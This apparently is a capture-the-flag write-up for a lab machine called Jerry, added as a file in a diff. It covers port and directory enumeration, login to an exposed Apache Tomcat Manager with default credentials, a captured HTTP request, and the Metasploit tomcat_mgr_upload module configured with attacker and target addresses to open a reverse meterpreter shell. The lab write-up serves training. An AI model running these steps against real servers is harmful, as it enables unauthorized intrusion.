@@ -1,0 +1,74 @@
+
+Jerry Lab - Vulnerabilities: Weak or default credentials, Tomcat Manager WAR File Upload, Exposed Apache Tomcat Manager Interface
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/7.0.88
+|_http-server-header: Apache-Coyote/1.1
+
+Let’s see if we can find any directories:
+gobuster dir -u http://10.129.136.9:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+
+/docs                 (Status: 302) [Size: 0] [--> /docs/]
+/examples             (Status: 302) [Size: 0] [--> /examples/]
+/manager              (Status: 302) [Size: 0] [--> /manager/] 
+
+
+Logging into http://10.129.136.9:8080/manager/html gives us the page below, leading to 403 access denied.
+
+
+
+We use the material on it to access manager-gui with user “tomcat” and password “s3cret”
+-Now we made it into the manager thing, let’s try to see if we can upload payload “ Tomcat Web Application Manager “
+
+Let’s try to go to burp suite and see what we can do:
+POST /manager/html/reload?path=/&org.apache.catalina.filters.CSRF_NONCE=515A3D91DBE1A4687CBF8243AC53D3E3 HTTP/1.1
+Host: 10.129.136.9:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.129.136.9:8080/manager/html/upload;jsessionid=B7886FD3B7C2C1FA0B6321DFBDC1E2AB?org.apache.catalina.filters.CSRF_NONCE=C031A93DFB2DB4E5CD828C58DBBF99C4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://10.129.136.9:8080
+DNT: 1
+Authorization: Basic dG9tY2F0OnMzY3JldA==
+Connection: close
+Cookie: JSESSIONID=7C5DC112A4210F5BDC6F1F9459AE4402
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+
+Nothing is really there, but we can upload WAR files on the web  server through the web application manager. 
+
+I found this:
+https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/ 
+
+It goes to metasploit
+msfconsole
+
+search tomcat
+
+There are multiple helpful modules:
+auxiliary/scanner/http/tomcat_mgr_login  - this module brute force the manager login, we could’ve also use this to help find username and password
+
+
+However, this suits our need because we already have credentials:
+7   exploit/multi/http/tomcat_mgr_upload
+
+use exploit/multi/http/tomcat_mgr_upload
+options
+set LHOST 10.10.14.251
+set RHOSTS 10.129.136.9
+set RPORT 8080
+set HttpPassword s3cret
+set HttpUsername tomcat
+run 
+
+We created a session on meterpreter, let’s see if we can find appropriate things now
+shell - launches the windows shell since Jerry is windows server
+cd ..
+We can find the flags within the desktop of Administrator in file called “2 for the price of 1.txt”
+type “2 for the price of 1.txt”
